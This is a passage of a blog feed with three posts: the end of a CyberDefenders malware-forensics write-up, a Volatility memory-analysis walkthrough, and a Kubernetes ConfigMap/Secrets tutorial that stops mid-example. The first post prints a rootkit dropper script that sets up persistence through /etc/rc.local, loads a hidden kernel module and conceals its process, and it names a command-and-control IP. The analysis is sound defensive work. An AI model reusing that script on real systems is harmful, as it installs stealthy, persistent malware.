class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">mv</span> 1 /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /var/mail/mail</span><br><span class=\"line\"><span class=\"built_in\">echo</span> -e <span class=\"string\">&quot;/var/mail/mail &amp;\\nsleep 1\\npidof mail &gt; /proc/dmesg\\nexit 0&quot;</span> &gt; /etc/rc.local</span><br><span class=\"line\"><span class=\"built_in\">nohup</span> /var/mail/mail &gt; /dev/null 2&gt;&amp;1&amp;</span><br><span class=\"line\"><span class=\"built_in\">mv</span> 2 /lib/modules/`<span class=\"built_in\">uname</span> -r`/sysmod.ko</span><br><span class=\"line\">depmod -a</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;sysmod&quot;</span> &gt;&gt; /etc/modules</span><br><span class=\"line\">modprobe sysmod</span><br><span class=\"line\"><span class=\"built_in\">sleep</span> 1</span><br><span class=\"line\">pidof mail &gt; /proc/dmesg</span><br><span class=\"line\"><span class=\"built_in\">rm</span> 3</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>10- What file has the script modified so the malware will start upon reboot?</p>\n</blockquote>\n<p>The script /etc/rc.local is for use by the system administrator. It is traditionally executed after all the normal system services are started</p>\n<div class=\"note success\">\n<p>Answer: /etc/rc.local</p>\n</div>\n<blockquote>\n<p>11- Where did the malware keep local files?</p>\n</blockquote>\n<div class=\"note success\">\n<p>/var/mail/</p>\n</div>\n<blockquote>\n<p>12- What is missing from ps.log?</p>\n</blockquote>\n<p>In the ps.log we don’t find the process related to the malware (the mail executable)</p>\n<div class=\"note success\">\n<p>/var/mail/mail</p>\n</div>\n<blockquote>\n<p>13- What is the main file that used to remove this information from ps.log?</p>\n</blockquote>\n<p>There is another binary that moved and renamed as  <code>sysmod.ko</code></p>\n<div class=\"note success\">\n<p>Answer: sysmod.ko</p>\n</div>\n<blockquote>\n<p>14- Inside the Main function, what is the function that causes requests to those servers?</p>\n</blockquote>\n<p>After unpacking the malware. I opened the binary with IDA Pro to decompile it. Check the main function and we found this !</p>\n<p><img data-src=\"https://imgur.com/79houmJ.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: requestFile</p>\n</div>\n<blockquote>\n<p>15- One of the IP’s the malware contacted starts with 17. Provide the full IP.</p>\n</blockquote>\n<p>requestFile function use address array as parameters. let’s check it ! we found all the IP address. COOL !</p>\n<p><img data-src=\"https://imgur.com/4NLcX9k.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 174.129.57.253</p>\n</div>\n<blockquote>\n<p>16- How many files the malware requested from external servers?</p>\n</blockquote>\n<p>This is easy man ! just check the other downloaded files !</p>\n<p><img data-src=\"https://imgur.com/hjMszwa.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: 9</p>\n</div>\n<blockquote>\n<p>17- What are the commands that the malware was receiving from attacker servers? Format: comma-separated in alphabetical order</p>\n</blockquote>\n<p>After spending time on thinking and searching. We get the idea !<br>\nThe malware will get message form attacker servers! So let’s check some functions call that related to something like messaging ! You’ll find these functions in main !</p>\n<p><img data-src=\"https://imgur.com/V4JQttO.png\" alt=\"\"></p>\n<p>The function check if the parameter has these 2 values ! I want to check it</p>\n<p><img data-src=\"https://imgur.com/KSxTPRa.png\" alt=\"\"></p>\n<p>After using python to convert the numbers to text using long_to_bytes function i found that 2 values are instruction in the assembly , Bingo we get it !</p>\n<p><img data-src=\"https://imgur.com/Hz6LsfB.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer: nop,run</p>\n</div>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/06/CyberDefenders/brave/",
            "url": "http://example.com/2022/09/06/CyberDefenders/brave/",
            "title": "CyberDefenders Writeup Brave",
            "date_published": "2022-09-06T10:29:37.000Z",
            "content_html": "<p>This CTF challenge is about retrieving data from a memory dump, and analyzing the processes and connections and dealing with registries!</p>\n<h1 id=\"challenge-information\"><a class=\"markdownIt-Anchor\" href=\"#challenge-information\">#</a> Challenge Information</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>A memory image was taken from a seized Windows machine. Analyze the image and answer the provided questions.</p>\n</div></details>\n<p>Challenge Link &amp; Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\" data-background-image=\"https://cyberdefenders.org/static/img/cyberdefenders-logo-white.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9jeWJlcmRlZmVuZGVycy5vcmcvYmx1ZXRlYW0tY3RmLWNoYWxsZW5nZXMvNjc=\">Challenge Link</span>\n          <p class=\"desc\">CyberDefenders - Brave</p>\n          </div></div><div class=\"item\" title=\"Author - DFIRScience\" style=\"--block-color:#fcc11c;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\" data-background-image=\"https://pbs.twimg.com/profile_images/1517319188167204866/lgRHWtGk_400x400.jpg\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9ERklSU2NpZW5jZQ==\">Author - DFIRScience</span>\n          <p class=\"desc\">DFIRScience Twitter Profile</p>\n          </div></div></div>\n<h1 id=\"walkthrough\"><a class=\"markdownIt-Anchor\" href=\"#walkthrough\">#</a> Walkthrough</h1>\n<p>Memory acquisition  involves copying the contents of volatile memory to non-volatile storage. This is arguably one of the most important and precarious steps in the memory forensics process<br>\nThe memory dump will contains many usefull information like the time of the memory acquisition, The KB version, The build number and version of the operating system</p>\n<blockquote>\n<p>1- What time was the RAM image acquired according to the suspect system? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We can inspect these information using  <code>imageinfo</code>  plugin in volatility</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.info </span><br><span class=\"line\"></span><br><span class=\"line\">Kernel Base     0xf8043cc00000</span><br><span class=\"line\">DTB     0x1aa000</span><br><span class=\"line\">Symbols ........</span><br><span class=\"line\">Is64Bit True</span><br><span class=\"line\">IsPAE   False</span><br><span class=\"line\">layer_name      0 WindowsIntel32e</span><br><span class=\"line\">memory_layer    1 FileLayer</span><br><span class=\"line\">KdVersionBlock  0xf8043d80f368</span><br><span class=\"line\">Major/Minor     15.19041</span><br><span class=\"line\">MachineType     34404</span><br><span class=\"line\">KeNumberProcessors      4</span><br><span class=\"line\">SystemTime      2021-04-30 17:52:19</span><br><span class=\"line\">NtSystemRoot    C:\\Windows</span><br><span class=\"line\">NtProductType   NtProductWinNt</span><br><span class=\"line\">NtMajorVersion  10</span><br><span class=\"line\">NtMinorVersion  0</span><br><span class=\"line\">PE MajorOperatingSystemVersion  10</span><br><span class=\"line\">PE MinorOperatingSystemVersion  0</span><br><span class=\"line\">PE Machine      34404</span><br><span class=\"line\">PE TimeDateStamp        Tue Oct 11 07:04:26 1977</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  2021-04-30 17:52:19</p>\n</div>\n<blockquote>\n<p>2- What is the SHA256 hash value of the RAM image?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">sha256sum</span> 20210430-Win10Home-20H2-64bit-memdump.mem</span><br><span class=\"line\">9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172 20210430-Win10Home-20H2-64bit-memdump.mem</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  9db01b1e7b19a3b2113bfb65e860fffd7a1630bdf2b18613d206ebf2aa0ea172</p>\n</div>\n<blockquote>\n<p>3- What is the process ID of “brave.exe”?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist | grep -i brave</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime              ExitTime       </span><br><span class=\"line\">4856    1872    brave.exe       0xbf0f6ca782c0  0       -       1               False    2021-04-30 17:48:45    2021-04-30 17:50:56</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 4856</p>\n</div>\n<blockquote>\n<p>4- How many established network connections were there at the time of acquisition? (number)</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED</span><br><span class=\"line\">0xbf0f6a53ca20  TCPv4   10.0.2.15       49833   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:50:07</span><br><span class=\"line\">0xbf0f6ad16050  TCPv4   10.0.2.15       49829   142.250.191.208 443     ESTABLISHED     5624    svchost.exe     2021-04-30 17:49:58</span><br><span class=\"line\">0xbf0f6ad1fad0  TCPv4   10.0.2.15       49847   52.230.222.68   443     ESTABLISHED     2812    svchost.exe     2021-04-30 17:52:17</span><br><span class=\"line\">0xbf0f6c6352b0  TCPv4   10.0.2.15       49842   52.113.196.254  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:25</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6cd4fa20  TCPv4   10.0.2.15       49837   204.79.197.200  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:18</span><br><span class=\"line\">0xbf0f6d0c64a0  TCPv4   10.0.2.15       49843   204.79.197.222  443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:26</span><br><span class=\"line\">0xbf0f6d51c4a0  TCPv4   10.0.2.15       49838   13.107.3.254    443     ESTABLISHED     5104    SearchApp.exe   2021-04-30 17:51:23</span><br><span class=\"line\">0xbf0f6d525a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br><span class=\"line\">0xe80000193a20  TCPv4   10.0.2.15       49845   23.101.202.202  443     ESTABLISHED     1156    MsMpEng.exe     2021-04-30 17:51:36</span><br></pre></td></tr></table></figure>\n<p>Oh wait man! Don’t count it manually, just use the magic of  <code>wc -l</code>  !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan  | grep -i <span class=\"string\">&quot;2021-04-30&quot;</span> | grep -i ESTABLISHED | <span class=\"built_in\">wc</span> -l</span><br><span class=\"line\"></span><br><span class=\"line\">10</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 10</p>\n</div>\n<blockquote>\n<p>5- What FQDN does Chrome have an established network connection with?</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.netscan | grep -i chrome</span><br><span class=\"line\">0xbf0f6a896ae0.0TCPv4   10.0.2.15DB scan49773fin185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6c7104d0  TCPv4   10.0.2.15       49778   185.70.41.130   443     ESTABLISHED     1840    chrome.exe      2021-04-30 17:45:00</span><br><span class=\"line\">0xbf0f6c85bb20  TCPv4   10.0.2.15       49775   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6ca71a20  TCPv4   10.0.2.15       49769   142.250.190.14  443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:55</span><br><span class=\"line\">0xbf0f6cbb9530  TCPv4   10.0.2.15       49772   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6cfd17f0  TCPv4   10.0.2.15       49777   35.186.220.63   443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:58</span><br><span class=\"line\">0xbf0f6d51c010  TCPv4   10.0.2.15       49763   172.217.4.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:53</span><br><span class=\"line\">0xbf0f6d5c8a70  TCPv4   10.0.2.15       49797   172.217.4.74    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:48:27</span><br><span class=\"line\">0xbf0f6d5d1ac0  TCPv4   10.0.2.15       49770   185.70.41.35    443     FIN_WAIT2       1840    chrome.exe      2021-04-30 17:44:57</span><br><span class=\"line\">0xbf0f6d8a1010  TCPv4   10.0.2.15       49771   185.70.41.35    443     CLOSE_WAIT      1840    chrome.exe      2021-04-30 17:44:57</span><br></pre></td></tr></table></figure>\n<p>Wow man! we found a single established connection with IP  <code>185.70.41.130</code> <br>\nI used a random website that give me the FQDN from the IP address!</p>\n<p><img data-src=\"https://imgur.com/XJSnlsS.png\" alt=\"\"></p>\n<div class=\"note success\">\n<p>Answer:  <code>protonmail.ch</code></p>\n</div>\n<blockquote>\n<p>6- What is the MD5 hash value of process executable for PID 6988?</p>\n</blockquote>\n<p>Let’s dump the executable of the process with pid 6988, I used to do that with  <code>procdump</code>  plugin with volatility2, but this time i am trying to use volatility3 so with somesearch i found that  <code>windows.pslist</code>  plugin has  <code>--dump</code>  argument that can dump the excutable of the process. Let’s do it !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pslist --pid 6988 --dump </span><br><span class=\"line\">Volatility 3 Framework 2.2.0</span><br><span class=\"line\">Progress:  100.00               PDB scanning finished</span><br><span class=\"line\">PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output</span><br><span class=\"line\"></span><br><span class=\"line\">6988    4352    OneDrive.exe    0xbf0f6d4262c0  26      -       1       True    2021-04-30 17:40:01     N/A     pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to use  <code>md5sum</code>  to get the md5 hash of the executable!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">md5sum</span> pid.6988.0x1c0000.dmp</span><br><span class=\"line\">0b493d8e26f03ccd2060e0be85f430af  pid.6988.0x1c0000.dmp</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 0b493d8e26f03ccd2060e0be85f430af</p>\n</div>\n<blockquote>\n<p>7- What is the word starting at offset 0x45BE876 with a length of 6 bytes?<br>\nOK we need to know the word at offset 0x45BE876! we can do it using  <code>xxd</code>  just we start from this offest and stop after 6 bytes! to specify the offset that you want to start from it just use  <code>-s</code>  options and to specify the length to display use  <code>-l</code>  option</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxd -g1 --s 0x45be876 -l 6 20210430-Win10Home-20H2-64bit-memdump.mem </span><br><span class=\"line\">045be876: 68 61 63 6b 65 72                                hacker</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: hacker</p>\n</div>\n<blockquote>\n<p>8- What is the creation date and time of the parent process of “powershell.exe”? (YYYY-MM-DD HH:MM:SS)</p>\n</blockquote>\n<p>We need to know the parent process of powershell! we can do it using  <code>pslist</code>  and check the  <code>PPID</code> . But I’ll go with  <code>pstree</code>  plugin! it will make it easier for me. I don’t want to waste my time searching at the parent process using PPID !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.pstree |  grep -i powershell -B 4</span><br><span class=\"line\">* 564   668     LogonUI.exe     0xbf0f6b7b7100  0       -       1       False   2021-04-30 12:39:44      2021-04-30 17:39:58</span><br><span class=\"line\">* 4296  668     userinit.exe    0xbf0f6ca8f080  0       -       1       False   2021-04-30 17:39:48      2021-04-30 17:40:12</span><br><span class=\"line\">** 4352 4296    explorer.exe    0xbf0f6ca662c0  82      -       1       False   2021-04-30 17:39:48      N/A</span><br><span class=\"line\">*** 6884        4352    VBoxTray.exe    0xbf0f6d186080  11      -       1       False   2021-04-30 17:40:01      N/A</span><br><span class=\"line\">*** 5096        4352    powershell.exe  0xbf0f6d97f2c0  12      -       1       False   2021-04-30 17:51:19      N/A</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer: 2021-04-30 17:39:48</p>\n</div>\n<blockquote>\n<p>9- What is the full path and name of the last file opened in notepad?</p>\n</blockquote>\n<p>Notepad is an executable that use the file as an argument ! so  <code>cmdline</code>  plugin will help us the get the files opened with notepad !</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.cmdline | grep -i notepad   </span><br><span class=\"line\">2520 notepad.exe     <span class=\"string\">&quot;C:\\Windows\\system32\\NOTEPAD.EXE&quot;</span> C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  C:\\Users\\JOHNDO~1\\AppData\\Local\\Temp\\7zO4FB31F24\\accountNum</p>\n</div>\n<blockquote>\n<p>10- How long did the suspect use Brave browser? (hh:mm:ss)</p>\n</blockquote>\n<p>Let me tell you something! When we speak about more details about system apps nothing will be usefull more than the windows registries! One of the most important registries is  <code>UserAssist</code> <br>\nThe  <code>UserAssist</code>  key, a part of Microsoft Windows registry, records the information related to programs run by a user on a Windows system</p>\n<p>Volatility is powerful! we can use the  <code>userassist</code>  plugin to get what we want!</p>\n<figure class=\"highlight bash\"><figcaption><span>command line prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol3 -f 20210430-Win10Home-20H2-64bit-memdump.mem windows.registry.userassist | grep -i brave </span><br><span class=\"line\">* 0xa80333cda0000       \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Temp\\GUM20E0.tmp\\BraveUpdate.exe N/A      0       0       0:00:03  N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   %ProgramFiles%\\BraveSoftware\\Update\\BraveUpdate.exe     N/A   0:00:24.797000   N/A</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;CEBFF5CD-ACE2-4F4F-9178-9926F41749EA&#125;\\Count  2021-04-30 17:52:18      Value   Brave   N/A     9       22      4:01:54  2021-04-30 17:48:45</span><br><span class=\"line\">* 0xa80333cda000        \\??\\C:\\Users\\John Doe\\ntuser.dat        ntuser.dat\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\&#123;F4E57C4B-2036-45F0-A9AB-443BCFE33D9F&#125;\\Count  2021-04-30 17:51:18      Value   C:\\Users\\Public\\Desktop\\Brave.lnk       N/A     8       0     0:00:00.508000   2021-04-30 17:48:45</span><br></pre></td></tr></table></figure>\n<div class=\"note success\">\n<p>Answer:  04:01:54</p>\n</div>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/06/Kubernetes/configmap-secrets/",
            "url": "http://example.com/2022/09/06/Kubernetes/configmap-secrets/",
            "title": "Introduction To Configmap & Secrets",
            "date_published": "2022-09-06T10:29:37.000Z",
            "content_html": "<h2 id=\"an-introduction-to-kubernetes-secrets-and-configmaps\"><a class=\"markdownIt-Anchor\" href=\"#an-introduction-to-kubernetes-secrets-and-configmaps\">#</a> An introduction to Kubernetes Secrets and ConfigMaps</h2>\n<p>Kubernetes has two types of objects that can inject configuration data into a container when it starts up: Secrets and ConfigMaps. Secrets and ConfigMaps behave similarly in Kubernetes, both in how they are created and because they can be exposed inside a container as mounted files or volumes or environment variables.</p>\n<h3 id=\"to-understand-more-how-configmap-and-secrets-are-important-lets-consider-the-following-scenario\"><a class=\"markdownIt-Anchor\" href=\"#to-understand-more-how-configmap-and-secrets-are-important-lets-consider-the-following-scenario\">#</a> To understand more how configmap and secrets are important let’s consider the following scenario:</h3>\n<p>You have to run a postgres docker image on your host, you explore the documentation of this docker image provided in <em><a href=\"%22https://hub.docker.com/_/postgres%22\">DockerHub</a></em> and you find that you the PostgreSQL image uses several environment variables and there is a mandatory variable called  <code>POSTGRES_PASSWORD</code>  must be defined by running this following command:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$  docker run --name my-postgres -e POSTGRES_PASSWORD=mypassword -d postgres</span><br></pre></td></tr></table></figure>\n<h3 id=\"but-how-we-can-use-this-environment-variables-and-how-we-can-manage-them-in-kubernetes\"><a class=\"markdownIt-Anchor\" href=\"#but-how-we-can-use-this-environment-variables-and-how-we-can-manage-them-in-kubernetes\">#</a> But how we can use this environment variables and how we can manage them in kubernetes ?</h3>\n<p>We can centralize the variables environment in two types of objects and import these variables in the manifest of a pod, replicasets, or deployments</p>\n<h3 id=\"what-is-a-configmaps\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-configmaps\">#</a> What is a ConfigMaps</h3>\n<p>In Kubernetes, a ConfigMap is nothing more than a key/value pair. A ConfigMap store’s non-confidential data, meaning no passwords or API keys. Pods can consume ConfigMaps as environment variables, command-line arguments, or as configuration files in a volume.</p>\n<p>A ConfigMap allows you to decouple environment-specific configuration from your container images, so that your applications are easily portable.</p>\n<h4 id=\"example-of-confimap-manifest-that-store-the-database-name-username\"><a class=\"markdownIt-Anchor\" href=\"#example-of-confimap-manifest-that-store-the-database-name-username\">#</a> Example of confimap manifest that store the database name &amp; username:</h4>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">ConfigMap</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">config-map</span></span><br><span class=\"line\"><span class=\"attr\">data:</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-db:</span> <span class=\"string\">&quot;database&quot;</span></span><br><span class=\"line\">  <span class=\"attr\">postgres-user:</span> <span class=\"string\">&quot;mohamed&quot;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"create-the-configmaps-object\"><a class=\"markdownIt-Anchor\" href=\"#create-the-configmaps-object\">#</a> Create the ConfigMaps Object:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl apply -f first-configmap.yaml</span><br><span class=\"line\">configmap/config-map created</span><br></pre></td></tr></table></figure>\n<h4 id=\"list-the-configmap-objects\"><a class=\"markdownIt-Anchor\" href=\"#list-the-configmap-objects\">#</a> List the ConfigMap Objects:</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ kubectl get configmap</span><br><span class=\"line\">NAME               DATA   AGE</span><br><span class=\"line\">config-map         2      26s</span><br><span class=\"line\">kube-root-ca.crt   1      13h</span><br></pre></td></tr></table></figure>\n<h3 id=\"what-is-a-secrets\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-secrets\">#</a> What is a Secrets:</h3>\n<p>Secrets are a Kubernetes object intended for storing a small amount of sensitive data. It is worth noting that Secrets are stored base64-encoded within Kubernetes, so they are not wildly secure.<br>\nSecrets are similar to ConfigMaps but are specifically intended to hold confidential data.</p>\n<h4 id=\"example-of-confimap-manifest-that-store-the-database-password\"><a class=\"markdownIt-Anchor\" href=\"#example-of-confimap-manifest-that-store-the-database-password\">#</a> Example of confimap manifest that store the database password:</h4>\n<p>we must encode the value that we will stored in the Secrets</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">justk8s@justk8s-master:~$ <span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;mohamed&quot;</span> | <span class=\"built_in\">base64</span></span><br><span class=\"line\">bW9oYW1lZA==</span><br></pre></td></tr></table></figure>\n<p>Now we can use the base64 cipher in the Secret manifest</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">Secret</span></span><br><span 